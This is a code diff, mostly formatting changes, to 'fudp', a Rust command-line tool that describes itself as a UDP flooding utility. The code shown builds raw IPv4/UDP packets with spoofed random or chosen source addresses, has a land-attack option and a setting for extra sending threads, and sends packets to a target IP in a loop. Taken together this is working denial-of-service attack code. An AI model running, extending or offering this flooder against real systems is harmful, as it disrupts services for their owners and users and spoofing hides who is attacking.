@@ -5,7 +5,7 @@ extern crate rand;
 
 use rand::Rng;
 use std::str::FromStr;
-use clap::{Arg, App};
+use clap::{App, Arg};
 use std::net::{IpAddr, Ipv4Addr};
 use pnet::transport;
 use pnet::packet::ip::IpNextHeaderProtocols;
@@ -14,41 +14,52 @@ use pnet::packet::Packet;
 use pnet::packet::PacketSize;
 use pnet::packet::MutablePacket;
 
-
 fn main() {
     let matches = App::new("fudp")
         .before_help("Please use responsibly")
         .version(format!("v{}", crate_version!()).as_ref())
         .author("xorrsprsp - https://github.com/xorrsprsp/")
         .about("fudp is a simple and very easy to use UDP flooding utility")
-        .arg(Arg::with_name("dst-ip")
-            .help("The IP to be targeted")
-            .required(true))
-        .arg(Arg::with_name("single-packet")
-            .short("1")
-            .help("Sends a single datagram and then exits"))
-        .arg(Arg::with_name("random-src")
-            .short("r")
-            .help("Spoofs a random sender IP"))
-        .arg(Arg::with_name("threads")
-            .short("i")
-            .help("Spin up extra threads generating datagrams")
-            .takes_value(true))
-        .arg(Arg::with_name("dst-port")
-            .short("p")
-            .help("Destination port")
-            .takes_value(true))
-        .arg(Arg::with_name("payload-size")
-            .short("z")
-            .help("UDP payload size (Default: 0; Empty packets)")
-            .takes_value(true))
-        .arg(Arg::with_name("src-ip")
-            .short("s")
-            .help("Spoofs a specified source IP")
-            .takes_value(true))
-        .arg(Arg::with_name("land-attack")
-            .short("l")
-            .help("Land Attack"))
+        .arg(
+            Arg::with_name("dst-ip")
+                .help("The IP to be targeted")
+                .required(true),
+        )
+        .arg(
+            Arg::with_name("single-packet")
+                .short("1")
+                .help("Sends a single datagram and then exits"),
+        )
+        .arg(
+            Arg::with_name("random-src")
+                .short("r")
+                .help("Spoofs a random sender IP"),
+        )
+        .arg(
+            Arg::with_name("threads")
+                .short("i")
+                .help("Spin up extra threads generating datagrams")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("dst-port")
+                .short("p")
+                .help("Destination port")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("payload-size")
+                .short("z")
+                .help("UDP payload size (Default: 0; Empty packets)")
+                .takes_value(true),
+        )
+        .arg(
+            Arg::with_name("src-ip")
+                .short("s")
+                .help("Spoofs a specified source IP")
+                .takes_value(true),
+        )
+        .arg(Arg::with_name("land-attack").short("l").help("Land Attack"))
         .get_matches();
 
     let dst_ip = matches.value_of("dst-ip").unwrap();
@@ -60,7 +71,7 @@ fn main() {
                 println!("Error: {}", err);
                 std::process::exit(1);
             }
-        }
+        },
         None => Ipv4Addr::new(0, 0, 0, 0),
     };
 
@@ -82,7 +93,7 @@ fn main() {
                 println!("Error while setting datagram size: {}", err);
                 std::process::exit(1);
             }
-        }
+        },
         None => 0,
     };
 
@@ -97,13 +108,15 @@ fn main() {
         }
     };
 
-
     if !src_ip.is_unspecified() && random_src == true {
         eprintln!("ERROR: -s and -r flags are mutually exclusive");
         std::process::exit(1);
     }
 
-    let (mut tx, _rx) = match transport::transport_channel(1000, transport::TransportChannelType::Layer3(IpNextHeaderProtocols::Udp)) {
+    let (mut tx, _rx) = match transport::transport_channel(
+        1000,
+        transport::TransportChannelType::Layer3(IpNextHeaderProtocols::Udp),
+    ) {
         Ok((tx, rx)) => (tx, rx),
         Err(e) => panic!("{}", e),
     };
@@ -147,12 +160,10 @@ fn main() {
         destination: dst_ip,
         options: vec![],
         payload: vec![0u8; udp_buffer_len as usize],
-
     };
 
     let mut ipv4_buffer = vec![0u8; 20 + udp_buffer_len as usize];
     let mut buffer_clone = ipv4_buffer.clone();
-
 
     let mut ipv4_packet = packet::ipv4::MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();
 
@@ -164,13 +175,14 @@ fn main() {
         cloned_packet.clone_from(&ipv4_packet);
 
         if random_src {
-            let random_ipv4_addr = Ipv4Addr::new(rng.gen::<u8>(),
-                                                 rng.gen::<u8>(),
-                                                 rng.gen::<u8>(),
-                                                 rng.gen::<u8>());
+            let random_ipv4_addr = Ipv4Addr::new(
+                rng.gen::<u8>(),
+                rng.gen::<u8>(),
+                rng.gen::<u8>(),
+                rng.gen::<u8>(),
+            );
             cloned_packet.set_source(random_ipv4_addr);
         }
-
 
         tx.send_to(cloned_packet, IpAddr::V4(dst_ip));
 
